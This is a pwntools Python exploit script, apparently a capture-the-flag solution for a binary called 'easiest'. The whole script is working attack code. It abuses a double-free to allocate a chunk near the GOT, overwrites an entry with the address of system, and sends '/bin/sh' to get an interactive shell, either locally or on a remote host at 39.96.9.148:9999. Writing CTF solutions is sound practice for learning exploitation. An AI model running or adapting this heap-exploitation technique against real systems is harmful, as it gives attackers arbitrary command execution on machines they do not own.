#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./easiest"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("39.96.9.148",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def add(idx,size,con):
    r.sendlineafter("delete \n","1".ljust(0x2f,"\x00"))
    r.sendlineafter("(0-11):",str(idx))
    r.sendlineafter("Length:",str(size))
    if len(con) == size:
        r.sendafter("C:",con)
    else:
        r.sendlineafter("C:",con)

def dele(idx):
    r.sendlineafter("delete \n","2".ljust(0x2f,"\x00"))
    r.sendlineafter("(0-11)",str(idx))

add(0,0x30,"a"*0x30)
add(1,0x30,"a"*0x30)
add(2,0x30,"a"*0x30)
dele(0)
dele(1)
dele(0)
add(0,0x30,p64(0x60203a))
add(0,0x30,"a")
add(0,0x30,"a")
add(0,0x30,"a"*0x16+p64(elf.sym["system"]))
r.sendline("/bin/sh".ljust(0x2f,"\x00"))
r.interactive()





